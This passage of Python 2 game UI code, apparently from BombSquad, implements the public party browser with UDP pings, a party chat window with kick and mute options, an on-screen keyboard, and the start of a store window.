                self, '_last_public_party_connect_attempt_time', None)
            if last_connect_time is None or now - last_connect_time > 2.0:
                bsInternal._connectToParty(address, port=port)
                self._last_public_party_connect_attempt_time = now

    def _set_public_party_selection(self, sel):
        if self._refreshing_public_party_list:
            return
        self._public_party_list_selection = sel

    def _update_internet_tab(self):
        import bsUI2

        # special case - if a party-queue window is up, don't do any of this
        # (keeps things smoother)
        if bsUI2.gHavePartyQueueWindow:
            return

        # if we've got a party-name text widget, keep its value plugged
        # into our public host name...
        text = getattr(self, '_internetHostNameText', None)
        if text is not None and text.exists():
            name = bs.textWidget(query=self._internetHostNameText)
            bsInternal._setPublicPartyName(name)

        # show/hide the lock icon depending on if we've got pro
        icon = getattr(self, '_internetLockIcon', None)
        if icon is not None and icon.exists():
            if self._isInternetLocked():
                bs.imageWidget(edit=icon, opacity=0.5)
            else:
                bs.imageWidget(edit=icon, opacity=0.0)

        if self._internet_tab == 'join':
            now = bs.getRealTime()
            if (now - getattr(self, '_internetJoinLastRefreshTime', -99999) >
                 bsInternal._getAccountMiscReadVal('pubPartyRefreshMS', 10000)):
                self._internetJoinLastRefreshTime = now
                env = bs.getEnvironment()
                bsInternal._addTransaction(
                    {'type': 'PUBLIC_PARTY_QUERY',
                     'proto': env['protocolVersion'],
                     'lang': bs.getLanguage()},
                    callback=bs.WeakCall(self._onPublicPartyQueryResult))
                bsInternal._runTransactions()

            # go through our existing public party entries firing off pings
            # for any that have timed out
            for party in self._public_parties.values():
                if party['nextPingTime'] <= now and _g_ping_thread_count < 15:

                    # make sure to fully catch up and not to multi-ping if
                    # we're way behind somehow..
                    while party['nextPingTime'] <= now:
                        # crank the interval up for high-latency parties to
                        # save us some work
                        mult = 1
                        if party['ping'] is not None:
                            mult = (10 if party['ping'] > 300
                                    else 5 if party['ping'] > 150 else 2)
                        party['nextPingTime'] += party['pingInterval'] * mult

                    class PingThread(threading.Thread):
                        def __init__(self, address, port, call):
                            threading.Thread.__init__(self)
                            # need utf8 here to avoid an error on our minimum
                            # bundled python
                            self._address = bs.utf8(address)
                            self._port = port
                            self._call = call

                        def run(self):
                            global _g_ping_thread_count
                            _g_ping_thread_count += 1
                            try:
                                import socket
                                socket_type = bsUtils._getIPAddressType(
                                    self._address)
                                s = socket.socket(socket_type,
                                                  socket.SOCK_DGRAM)
                                s.connect((self._address, self._port))

                                accessible = False
                                start_time = time.time()
                                # send a simple ping and wait for a response;
                                # if we get it, they're accessible...

                                # send a few pings and wait a second for
                                # a response
                                s.settimeout(1)
                                for i in range(3):
                                    s.send('\x0b')
                                    try:
                                        # 11: BS_PACKET_SIMPLE_PING
                                        result = s.recv(10)
                                    except Exception:
                                        result = None
                                    if result == '\x0c':
                                        # 12: BS_PACKET_SIMPLE_PONG
                                        accessible = True
                                        break
                                    time.sleep(1)
                                s.close()
                                ping = int((time.time()-start_time)*1000.0)
                                bs.callInGameThread(
                                    bs.Call(
                                        self._call, self._address, self._port,
                                        ping if accessible else None))
                            except Exception as e:
                                global gPingErrorReported
                                if not gPingErrorReported:
                                    gPingErrorReported = True
                            _g_ping_thread_count -= 1

                    PingThread(
                        party['address'],
                        party['port'],
                        bs.WeakCall(self._ping_callback)).start()

    def _ping_callback(self, address, port, result):
        # look for a widget corresponding to this target; if we find one,
        # update our list
        party = self._public_parties.get(address+'_'+str(port))
        if party is not None:
            # we now smooth ping a bit to reduce jumping around in the list
            # (only where pings are relatively good)
            current_ping = party.get('ping')
            if (current_ping is not None and result is not None
                    and result < 150):
                smoothing = 0.7
                party['ping'] = int(smoothing * current_ping
                                    + (1.0 - smoothing) * result)
            else:
                party['ping'] = result
            if 'ping_widget' not in party:
                pass  # this can happen if we switch away and then back to the
            # client tab while pings are in flight
            elif party['ping_widget'].exists():
                self._rebuild_public_party_list()

    def _do_internet_status_check(self):
        bs.textWidget(edit=self._internetHostStatusText, color=(1, 1, 0),
                      text=bs.Lstr(resource=self._r+'.partyStatusCheckingText'))
        bsUtils.serverGet('bsAccessCheck', {}, callback=bs.WeakCall(
            self._on_public_party_accessible_response))

    def _on_start_internet_advertizing_press(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return

        # requires sign-in and pro
        if self._isInternetLocked():
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
            else:
                PurchaseWindow(items=['pro'])
            return

        name = bs.textWidget(query=self._internetHostNameText)
        if name == '':
            bs.screenMessage(
                bs.Lstr(resource='internal.invalidNameErrorText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return
        bsInternal._setPublicPartyName(name)
        bs.getConfig()['Public Party Name'] = name
        bs.writeConfig()
        bs.playSound(bs.getSound('shieldUp'))
        bsInternal._setPublicPartyEnabled(True)
        self._do_internet_status_check()
        bs.buttonWidget(edit=self._internetHostToggleButton, label=bs.Lstr(
            resource='gatherWindow.makePartyPrivateText',
            fallbackResource='gatherWindow.stopAdvertisingText'),
            onActivateCall=self._on_stop_internet_advertising_press)

    def _on_public_party_accessible_response(self, data):
        # if we've got status text widgets, update them..
        text = getattr(self, '_internetHostStatusText', None)
        if text is not None and text.exists():
            if data is None:
                bs.textWidget(
                    edit=text, text=bs.Lstr(
                        resource=self._r + '.partyStatusNoConnectionText'),
                    color=(1, 0, 0))
            else:
                if not data.get('accessible', False):
                    if self._internetLocalAddress is not None:
                        exLine = bs.Lstr(
                            value='\n${A} ${B}',
                            subs=[('${A}', bs.Lstr(
                                resource=self._r +
                                '.manualYourLocalAddressText')),
                                ('${B}', self._internetLocalAddress)])
                    else:
                        exLine = ''
                    bs.textWidget(
                        edit=text, text=bs.Lstr(
                            value='${A}\n${B}${C}',
                            subs=[('${A}', bs.Lstr(
                                resource=self._r +
                                '.partyStatusNotJoinableText')),
                                ('${B}', bs.Lstr(
                                    resource=self._r +
                                    '.manualRouterForwardingText',
                                    subs=[('${PORT}',
                                           str(
                                               bsInternal._getGamePort()))])),
                                ('${C}', exLine)]),
                        color=(1, 0, 0))
                else:
                    bs.textWidget(
                        edit=text, text=bs.Lstr(
                            resource=self._r + '.partyStatusJoinableText'),
                        color=(0, 1, 0))

    def _on_stop_internet_advertising_press(self):
        bsInternal._setPublicPartyEnabled(False)
        bs.playSound(bs.getSound('shieldDown'))
        text = getattr(self, '_internetHostStatusText', None)
        if text is not None and text.exists():
            bs.textWidget(
                edit=text, text=bs.Lstr(
                    resource=self._r + '.partyStatusNotPublicText'),
                color=(0.6, 0.6, 0.6))

        bs.buttonWidget(edit=self._internetHostToggleButton, label=bs.Lstr(
            resource='gatherWindow.makePartyPublicText',
            fallbackResource='gatherWindow.startAdvertisingText'),
            onActivateCall=self._on_start_internet_advertizing_press)

    def _access_check_update(self, t_addr, t_accessible, t_accessible_extra):
        # if we don't have an outstanding query, start one..
        if not self._doing_access_check and self._access_check_count < 100:
            self._doing_access_check = True
            self._access_check_count += 1
            self._t_addr = t_addr
            self._t_accessible = t_accessible
            self._t_accessible_extra = t_accessible_extra
            bsUtils.serverGet(
                'bsAccessCheck', {},
                callback=bs.WeakCall(self._on_accessible_response))

    def _on_accessible_response(self, data):
        t_addr = self._t_addr
        t_accessible = self._t_accessible
        t_accessible_extra = self._t_accessible_extra
        self._doing_access_check = False
        color_bad = (1, 1, 0)
        color_good = (0, 1, 0)
        if data is None or 'address' not in data or 'accessible' not in data:
            if t_addr.exists():
                bs.textWidget(
                    edit=t_addr, text=bs.Lstr(
                        resource=self._r + '.noConnectionText'),
                    color=color_bad)
            if t_accessible.exists():
                bs.textWidget(
                    edit=t_accessible, text=bs.Lstr(
                        resource=self._r + '.noConnectionText'),
                    color=color_bad)
            if t_accessible_extra.exists():
                bs.textWidget(edit=t_accessible_extra, text='', color=color_bad)
            return
        if t_addr.exists():
            bs.textWidget(edit=t_addr, text=data['address'], color=color_good)
        if t_accessible.exists():
            if data['accessible']:
                bs.textWidget(
                    edit=t_accessible, text=bs.Lstr(
                        resource=self._r + '.manualJoinableYesText'),
                    color=color_good)
                if t_accessible_extra.exists():
                    bs.textWidget(edit=t_accessible_extra,
                                  text='', color=color_good)
            else:
                bs.textWidget(
                    edit=t_accessible, text=bs.Lstr(
                        resource=self._r + '.manualJoinableNoWithAsteriskText'),
                    color=color_bad)
                if t_accessible_extra.exists():
                    bs.textWidget(
                        edit=t_accessible_extra, text=bs.Lstr(
                            resource=self._r + '.manualRouterForwardingText',
                            subs=[('${PORT}', str(
                                bsInternal._getGamePort()))]),
                        color=color_bad)

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._backButton:
                selName = 'Back'
            elif sel in self._tab_buttons.values():
                selName = 'Tab:' + self._tab_buttons.keys()[
                    self._tab_buttons.values().index(sel)]
            elif sel == self._tabContainer:
                selName = 'TabContainer'
            else:
                raise Exception("unrecognized selection: "+str(sel))
            gWindowStates[self.__class__.__name__] = {
                'selName': selName, 'tab': self._current_tab,
                'internetTab': self._internet_tab}
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            try:
                self._internet_tab = gWindowStates[self.__class__.__name__][
                    'internetTab']
            except Exception:
                self._internet_tab = 'join'
            try:
                current_tab = bs.getConfig()['Gather Tab']
            except Exception:
                current_tab = None
            if current_tab is None or current_tab not in self._tab_buttons:
                current_tab = 'about'
            self._setTab(current_tab)
            if selName == 'Back':
                sel = self._backButton
            elif selName == 'TabContainer':
                sel = self._tabContainer
            elif type(selName) is str and selName.startswith('Tab:'):
                sel = self._tab_buttons[selName.split(':')[-1]]
            else:
                sel = self._tab_buttons[current_tab]
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()


class PartyWindow(Window):

    def __del__(self):
        bsInternal._setPartyWindowOpen(False)

    def __init__(self, origin=(0, 0)):
        bsInternal._setPartyWindowOpen(True)
        self._r = 'partyWindow'
        self._width = 500
        self._height = 365 if gSmallUI else 480 if gMedUI else 600
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition='inScale', color=(0.40, 0.55, 0.20),
            parent=bsInternal._getSpecialWidget('overlayStack'),
            onOutsideClickCall=self.closeWithSound,
            scaleOriginStackOffset=origin, scale=2.0
            if gSmallUI else 1.35 if gMedUI else 1.0, stackOffset=(0, -10)
            if gSmallUI else(240, 0) if gMedUI else(330, 20))

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, scale=0.7, position=(30, self._height - 47),
            size=(50, 50),
            label='', onActivateCall=self.close, autoSelect=True,
            color=(0.45, 0.63, 0.15),
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)
        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        self._menuButton = bs.buttonWidget(
            parent=self._rootWidget, scale=0.7,
            position=(self._width - 60, self._height - 47),
            size=(50, 50),
            label='...', autoSelect=True, buttonType='square',
            onActivateCall=bs.WeakCall(self._onMenuButtonPress),
            color=(0.55, 0.73, 0.25),
            iconScale=1.2)

        info = bsInternal._getConnectionToHostInfo()
        if info.get('name', '') != '':
            title = info['name']
        else:
            title = bs.Lstr(resource=self._r+'.titleText')

        self._titleText = bs.textWidget(
            parent=self._rootWidget, scale=0.9, color=(0.5, 0.7, 0.5),
            text=title, size=(0, 0),
            position=(self._width * 0.5, self._height - 29),
            maxWidth=self._width * 0.7, hAlign='center', vAlign='center')

        self._emptyStr = bs.textWidget(
            parent=self._rootWidget, scale=0.75, size=(0, 0),
            position=(self._width * 0.5, self._height - 65),
            maxWidth=self._width * 0.85, hAlign='center', vAlign='center')

        self._scrollWidth = self._width-50
        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            size=(self._scrollWidth, self._height - 200),
            position=(30, 80),
            color=(0.4, 0.6, 0.3))
        self._columnWidget = bs.columnWidget(parent=self._scrollWidget)
        bs.widget(edit=self._menuButton, downWidget=self._columnWidget)

        self._mutedText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width*0.5, self._height*0.5),
            size=(0, 0), hAlign='center', vAlign='center',
            text=bs.Lstr(resource='chatMutedText'))
        self._chatTexts = []

        # add all existing messages if chat is not muted
        if not bsInternal._getSetting('Chat Muted'):
            msgs = bsInternal._getChatMessages()
            for msg in msgs:
                self._addMsg(msg)

        self._textField = t = bs.textWidget(
            parent=self._rootWidget, editable=True, size=(530, 40),
            position=(44, 39), text='', maxWidth=494, shadow=0.3, flatness=1.0,
            description=bs.Lstr(resource=self._r+'.chatMessageText'),
            autoSelect=True, vAlign='center', cornerScale=0.7)

        bs.widget(
            edit=self._scrollWidget, autoSelect=True,
            leftWidget=self._cancelButton, upWidget=self._cancelButton,
            downWidget=self._textField)
        bs.widget(edit=self._columnWidget, autoSelect=True,
                  upWidget=self._cancelButton, downWidget=self._textField)
        bs.containerWidget(edit=self._rootWidget, selectedChild=t)
        b = bs.buttonWidget(
            parent=self._rootWidget, size=(50, 35),
            label=bs.Lstr(resource=self._r + '.sendText'),
            buttonType='square', autoSelect=True,
            position=(self._width - 70, 35),
            onActivateCall=self._sendChatMessage)
        bs.textWidget(edit=t, onReturnPressCall=b.activate)

        self._nameWidgets = []
        self._roster = None
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            repeat=True, timeType='real')
        self._update()

    def onChatMessage(self, msg):
        if not bsInternal._getSetting('Chat Muted'):
            self._addMsg(msg)

    def _addMsg(self, msg):
        t = bs.textWidget(
            parent=self._columnWidget, text=msg, hAlign='left', vAlign='center',
            size=(0, 13),
            scale=0.55, maxWidth=self._scrollWidth * 0.94, shadow=0.3,
            flatness=1.0)
        self._chatTexts.append(t)
        if len(self._chatTexts) > 40:
            first = self._chatTexts.pop(0)
            first.delete()
        bs.containerWidget(edit=self._columnWidget, visibleChild=t)

    def _onMenuButtonPress(self):
        isMuted = bsInternal._getSetting('Chat Muted')
        PopupMenuWindow(
            position=self._menuButton.getScreenSpaceCenter(),
            scale=2.3 if gSmallUI else 1.65 if gMedUI else 1.23,
            choices=['unmute' if isMuted else 'mute'],
            choicesDisplay=[bs.Lstr(
                resource='chatUnMuteText'
                if isMuted else 'chatMuteText')],
            currentChoice='unmute' if isMuted else 'mute', delegate=self)
        self._popupType = 'menu'

    def _update(self):

        # update muted state
        if bsInternal._getSetting('Chat Muted'):
            bs.textWidget(edit=self._mutedText, color=(1, 1, 1, 0.3))
            # clear any chat texts we're showing
            if self._chatTexts:
                while self._chatTexts:
                    first = self._chatTexts.pop()
                    first.delete()
        else:
            bs.textWidget(edit=self._mutedText, color=(1, 1, 1, 0.0))

        # update roster section
        roster = bsInternal._getGameRoster()
        if roster != self._roster:

            self._roster = roster

            # clear out old
            for w in self._nameWidgets:
                w.delete()
            self._nameWidgets = []
            if len(self._roster) == 0:
                topSectionHeight = 60
                bs.textWidget(edit=self._emptyStr,
                              text=bs.Lstr(resource=self._r+'.emptyText'))
                bs.scrollWidget(
                    edit=self._scrollWidget,
                    size=(self._width - 50,
                          self._height - topSectionHeight - 110),
                    position=(30, 80))
            else:
                columns = 1 if len(
                    self._roster) == 1 else 2 if len(
                    self._roster) == 2 else 3
                rows = int(math.ceil(float(len(self._roster))/columns))
                cWidth = (self._width*0.9)/max(3, columns)
                cWidthTotal = cWidth*columns
                cHeight = 24
                cHeightTotal = cHeight*rows
                for y in range(rows):
                    for x in range(columns):
                        index = y*columns+x
                        if index < len(self._roster):
                            tScale = 0.65
                            pos = (
                                self._width * 0.53 - cWidthTotal * 0.5 + cWidth
                                * x - 23, self._height - 65 - cHeight * y - 15)

                            # if there are players present for this client, use
                            # their names as a display string instead of the
                            # client spec-string
                            try:
                                if self._roster[index]['players']:
                                    # if there's just one, use the full name;
                                    # otherwise combine short names
                                    if len(self._roster[index]['players']) == 1:
                                        pStr = self._roster[index]['players'][
                                            0]['nameFull']
                                    else:
                                        pStr = ('/'.join(
                                            [entry['name'] for entry in
                                             self._roster[index]['players']]))
                                        if len(pStr) > 25:
                                            pStr = pStr[:25]+'...'
                                else:
                                    pStr = self._roster[index]['displayString']
                            except Exception:
                                bs.printException(
                                    'error calcing client name str')
                                pStr = '???'

                            w = bs.textWidget(
                                parent=self._rootWidget,
                                position=(pos[0],
                                          pos[1]),
                                scale=tScale, size=(cWidth * 0.85, 30),
                                maxWidth=cWidth * 0.85, color=(1, 1, 1)
                                if index == 0 else(1, 1, 1), selectable=True,
                                autoSelect=True, clickActivate=True,
                                text=bs.Lstr(value=pStr),
                                hAlign='left', vAlign='center')
                            self._nameWidgets.append(w)

                            # in newer versions clientID will be present and
                            # we can use that to determine who the host is.
                            # in older versions we assume the first client is
                            # host
                            if self._roster[index]['clientID'] is not None:
                                isHost = True if self._roster[index][
                                    'clientID'] == -1 else False
                            else:
                                isHost = (index == 0)

                            # FIXME - should pass clientID to these sort of
                            # calls; not spec-string (perhaps should wait till
                            # clientID is more readily available though)
                            bs.textWidget(edit=w, onActivateCall=bs.Call(
                                self._onPartyMemberPress,
                                self._roster[index]['clientID'], isHost, w))
                            pos = (self._width * 0.53 - cWidthTotal * 0.5 +
                                   cWidth * x, self._height - 65 - cHeight * y)

                            # make the assumption that the first roster entry is
                            # the server (should probably not do this..)
                            if isHost:
                                tw = min(
                                    cWidth*0.85, bsInternal._getStringWidth(
                                        pStr, suppressWarning=True)*tScale)
                                self._nameWidgets.append(
                                    bs.textWidget(
                                        parent=self._rootWidget,
                                        position=(pos[0] + tw + 1,
                                                  pos[1] - 0.5),
                                        size=(0, 0),
                                        hAlign='left', vAlign='center',
                                        maxWidth=cWidth * 0.96 - tw,
                                        color=(0.1, 1, 0.1, 0.5),
                                        text=bs.Lstr(
                                            resource=self._r + '.hostText'),
                                        scale=0.4, shadow=0.1, flatness=1.0))
                bs.textWidget(edit=self._emptyStr, text='')
                bs.scrollWidget(
                    edit=self._scrollWidget,
                    size=(self._width - 50,
                          max(100, self._height - 139 - cHeightTotal)),
                    position=(30, 80))

    def popupMenuSelectedChoice(self, popupWindow, choice):
        if self._popupType == 'partyMemberPress':
            if self._popupPartyMemberIsHost:
                bs.playSound(bs.getSound('error'))
                bs.screenMessage(
                    bs.Lstr(resource='internal.cantKickHostError'),
                    color=(1, 0, 0))
            else:
                # Ban for 5 minutes.
                result = bsInternal._disconnectClient(
                    self._popupPartyMemberClientID, banTime=5*60)
                if not result:
                    bs.playSound(bs.getSound('error'))
                    bs.screenMessage(
                        bs.Lstr(
                            resource='getTicketsWindow.unavailableText'),
                        color=(1, 0, 0))
        elif self._popupType == 'menu':
            if choice in ('mute', 'unmute'):
                bsConfig = bs.getConfig()
                bsConfig['Chat Muted'] = (choice == 'mute')
                bs.writeConfig()
                bs.applySettings()
                self._update()
        else:
            print 'unhandled popup type: '+str(self._popupType)

    def popupMenuClosing(self, popupWindow):
        pass

    def _onPartyMemberPress(self, clientID, isHost, widget):
        # if we're the host, pop up 'kick' options for all non-host members
        if bsInternal._getForegroundHostSession() is not None:
            kickStr = bs.Lstr(resource='kickText')
        else:
            # kick-votes appeared in build 14248
            if bsInternal._getConnectionToHostInfo().get(
                    'buildNumber', 0) < 14248:
                return
            kickStr = bs.Lstr(resource='kickVoteText')
        PopupMenuWindow(position=widget.getScreenSpaceCenter(),
                        scale=2.3 if gSmallUI else 1.65 if gMedUI else 1.23,
                        choices=['kick'],
                        choicesDisplay=[kickStr],
                        currentChoice='kick',
                        delegate=self)
        self._popupType = 'partyMemberPress'
        self._popupPartyMemberClientID = clientID
        self._popupPartyMemberIsHost = isHost

    def _sendChatMessage(self):
        bsInternal._chatMessage(bs.textWidget(query=self._textField))
        bs.textWidget(edit=self._textField, text='')

    def close(self):
        bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def closeWithSound(self):
        bs.playSound(bs.getSound('swish'))
        self.close()


gPartyWindow = None


def onPartyIconActivate(origin):
    global gPartyWindow
    bs.playSound(bs.getSound('swish'))
    # if it exists, dismiss it; otherwise make a new one
    if gPartyWindow is not None and gPartyWindow() is not None:
        gPartyWindow().close()
    else:
        gPartyWindow = weakref.ref(PartyWindow(origin=origin))


class OnScreenKeyboardWindow(Window):

    def __init__(self, textWidget, label, maxChars):

        self._targetText = textWidget

        self._width = 700
        self._height = 400

        topExtra = 20 if gSmallUI else 0
        target = self._targetText.getScreenSpaceCenter()
        self._rootWidget = bs.containerWidget(
            parent=bsInternal._getSpecialWidget('overlayStack'),
            size=(self._width, self._height + topExtra),
            transition='inScale',
            scaleOriginStackOffset=self._targetText.getScreenSpaceCenter(),
            scale=2.0 if gSmallUI else 1.5 if gMedUI else 1.0,
            stackOffset=(0, 0) if gSmallUI else(0, 0) if gMedUI else(0, 0))
        self._doneButton = bs.buttonWidget(
            parent=self._rootWidget, position=(self._width - 200, 44),
            size=(140, 60),
            autoSelect=True, label=bs.Lstr(resource='doneText'),
            onActivateCall=self._done)
        bs.containerWidget(
            edit=self._rootWidget, onCancelCall=self._cancel,
            startButton=self._doneButton)

        bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 41),
            size=(0, 0),
            scale=0.95, text=label, maxWidth=self._width - 140,
            color=gTitleColor, hAlign='center', vAlign='center')

        self._textField = bs.textWidget(
            parent=self._rootWidget, position=(70, self._height - 116),
            maxChars=maxChars, text=bs.textWidget(query=self._targetText),
            onReturnPressCall=self._done, autoSelect=True,
            size=(self._width - 140, 55),
            vAlign='center', editable=True, maxWidth=self._width - 175,
            forceInternalEditing=True, alwaysShowCarat=True)

        self._shiftButton = None
        self._numModeButton = None
        self._charKeys = []
        self._mode = 'normal'

        h = 79
        v = self._height - 180
        keyWidth = 46
        keyHeight = 46
        self._keyColorLit = keyColorLit = (1.4, 1.2, 1.4)
        self._keyColor = keyColor = (0.69, 0.6, 0.74)
        self._keyColorDark = keyColorDark = (0.55, 0.55, 0.71)
        keyTextColor = (1, 1, 1)
        rowStarts = (69, 95, 151)

        self._clickSound = bs.getSound('click01')

        # kill prev char keys
        for key in self._charKeys:
            key.delete()
        self._charKeys = []

        # dummy data just used for row/column lengths... we dont actually
        # set things until refresh
        chars = [('q', 'u', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p'),
                 ('a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l'),
                 ('z', 'x', 'c', 'v', 'b', 'n', 'm')]

        for rowNum, row in enumerate(chars):
            h = rowStarts[rowNum]
            # shift key before row 3
            if rowNum == 2:
                self._shiftButton = bs.buttonWidget(
                    parent=self._rootWidget, position=(h - keyWidth * 2.0, v),
                    size=(keyWidth * 1.7, keyHeight),
                    autoSelect=True, textColor=keyTextColor, color=keyColorDark,
                    label=bs.getSpecialChar('shift'),
                    enableSound=False, extraTouchBorderScale=0.3,
                    buttonType='square',)

            for char in row:
                b = bs.buttonWidget(
                    parent=self._rootWidget, position=(h, v),
                    size=(keyWidth, keyHeight),
                    autoSelect=True, enableSound=False, textColor=keyTextColor,
                    color=keyColor, label='', buttonType='square',
                    extraTouchBorderScale=0.1,)
                self._charKeys.append(b)
                h += keyWidth+10

            # add delete key at end of third row
            if rowNum == 2:
                b = bs.buttonWidget(
                    parent=self._rootWidget, position=(h + 4, v),
                    size=(keyWidth * 1.8, keyHeight),
                    autoSelect=True, enableSound=False, repeat=True,
                    textColor=keyTextColor, color=keyColorDark,
                    label=bs.getSpecialChar('delete'),
                    buttonType='square', onActivateCall=self._del)
            v -= (keyHeight+9)
            # do space bar and stuff..
            if rowNum == 2:
                if self._numModeButton is None:
                    self._numModeButton = bs.buttonWidget(
                        parent=self._rootWidget, position=(112, v-8),
                        size=(keyWidth*2, keyHeight+5),
                        enableSound=False,
                        buttonType='square',
                        extraTouchBorderScale=0.3,
                        autoSelect=True, textColor=keyTextColor,
                        color=keyColorDark, label='',
                    )
                b1 = self._numModeButton
                b2 = bs.buttonWidget(
                    parent=self._rootWidget, position=(210, v - 12),
                    size=(keyWidth * 6.1, keyHeight + 15),
                    extraTouchBorderScale=0.3, enableSound=False,
                    autoSelect=True, textColor=keyTextColor, color=keyColorDark,
                    label=bs.Lstr(resource='spaceKeyText'),
                    onActivateCall=bs.Call(self._typeChar, ' '))
                bs.widget(edit=b1, rightWidget=b2)
                bs.widget(edit=b2, leftWidget=b1, rightWidget=self._doneButton)
                bs.widget(edit=self._doneButton, leftWidget=b2)

        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._charKeys[14])

        self._refresh()

    def _refresh(self):

        if self._mode in ['normal', 'caps']:
            chars = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',
                     'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',
                     'z', 'x', 'c', 'v', 'b', 'n', 'm']
            if self._mode == 'caps':
                chars = [c.upper() for c in chars]
            bs.buttonWidget(
                edit=self._shiftButton, color=self._keyColorLit
                if self._mode == 'caps' else self._keyColorDark,
                label=bs.getSpecialChar('shift'),
                onActivateCall=self._shift)
            bs.buttonWidget(
                edit=self._numModeButton, label='123#&*',
                onActivateCall=self._numMode)
        elif self._mode == 'num':
            chars = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
                     '-', '/', ':', ';', '(', ')', '$', '&', '@',
                     '"', '.', ',', '?', '!', '\'', '_']
            bs.buttonWidget(
                edit=self._shiftButton, color=self._keyColorDark, label='',
                onActivateCall=self._nullPress)
            bs.buttonWidget(
                edit=self._numModeButton, label='abc',
                onActivateCall=self._abcMode)

        for i, b in enumerate(self._charKeys):
            bs.buttonWidget(edit=b, label=chars[i],
                            onActivateCall=bs.Call(self._typeChar, chars[i]))

    def _nullPress(self):
        bs.playSound(self._clickSound)
        pass

    def _abcMode(self):
        bs.playSound(self._clickSound)
        self._mode = 'normal'
        self._refresh()

    def _numMode(self):
        bs.playSound(self._clickSound)
        self._mode = 'num'
        self._refresh()

    def _shift(self):
        bs.playSound(self._clickSound)
        if self._mode == 'normal':
            self._mode = 'caps'
        elif self._mode == 'caps':
            self._mode = 'normal'
        # self._shiftPressed = True
        self._refresh()

    def _del(self):
        bs.playSound(self._clickSound)
        t = bs.textWidget(query=self._textField)
        t = t[:-1]
        bs.textWidget(edit=self._textField, text=t)

    def _typeChar(self, char):
        bs.playSound(self._clickSound)
        # operate in unicode so we don't do anything funky like chop utf-8
        # chars in half
        t = bs.textWidget(query=self._textField)
        t += char
        bs.textWidget(edit=self._textField, text=t)
        # if we were caps, go back
        if self._mode == 'caps':
            self._mode = 'normal'
        self._refresh()

    def _cancel(self):
        bs.playSound(bs.getSound('swish'))
        bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def _done(self):

        bs.containerWidget(edit=self._rootWidget, transition='outScale')

        if self._targetText.exists():
            bs.textWidget(
                edit=self._targetText, text=bs.textWidget(
                    query=self._textField))


class StoreWindow(Window):

    def _updateGetTicketsButtonPos(self):
        if self._getTicketsButton.exists():
            p = (
                self._width - 252 -
                (self._xInset +
                 (47 if gSmallUI and bsInternal._isPartyIconVisible() else 0)),
                self._height - 70)
            bs.buttonWidget(edit=self._getTicketsButton, position=p)

    def __init__(self, transition='inRight', modal=False, showTab=None,
                 onCloseCall=None, backLocation=None, originWidget=None):

        bsInternal._setAnalyticsScreen('Store Window')

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._backLocation = backLocation
        self._onCloseCall = onCloseCall
        self._show_tab = showTab
        self._modal = modal
        self._width = 1240 if gSmallUI else 1040
        self._xInset = xInset = 100 if gSmallUI else 0
        self._height = 578 if gSmallUI else 645 if gMedUI else 800
        self._current_tab = None
        extraTop = 30 if gSmallUI else 0

        self._request = None
        self._r = 'store'
        self._lastBuyTime = 0

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + extraTop),
            transition=transition, toolbarVisibility='MENU_FULL', scale=1.3
            if gSmallUI else 0.9 if gMedUI else 0.8,
            scaleOriginStackOffset=scaleOrigin, stackOffset=(0, -5)
            if gSmallUI else(0, 0) if gMedUI else(0, 0))

        self._backButton = backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(70 + xInset, self._height - 74),
            size=(140, 60),
            scale=1.1, autoSelect=True, label=bs.Lstr(
                resource='doneText' if self._modal else 'backText'),
            buttonType=None if self._modal else 'back',
            onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        self._getTicketsButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            size=(210, 65),
            onActivateCall=self._on_get_more_tickets_press,
            autoSelect=True,
            scale=0.9,
            textScale=1.4,
            leftWidget=self._backButton,
            color=(0.7, 0.5, 0.85),
            textColor=(0.2, 1.0, 0.2),
            label=bs.Lstr(resource='getTicketsWindow.titleText'))

        # move this dynamically to keep it out of the way of the party icon :-(
        self._updateGetTicketsButtonPos()
        self._getTicketPosUpdateTimer = bs.Timer(
            1000, bs.WeakCall(self._updateGetTicketsButtonPos),
            repeat=True, timeType='real')
        bs.widget(edit=self._backButton, rightWidget=self._getTicketsButton)
        self._ticketTextUpdateTimer = bs.Timer(
            1000, bs.WeakCall(self._updateTicketsText),
            timeType='real', repeat=True)
        self._updateTicketsText()

        env = bs.getEnvironment()
        if (env['platform'] in ['mac', 'ios']
                and env['subplatform'] == 'appstore'):
            b = bs.buttonWidget(
                parent=self._rootWidget, position=(self._width*0.5-70, 16),
                size=(230, 50), scale=0.65,
                onActivateCall=bs.WeakCall(
                    self._restorePurchases),
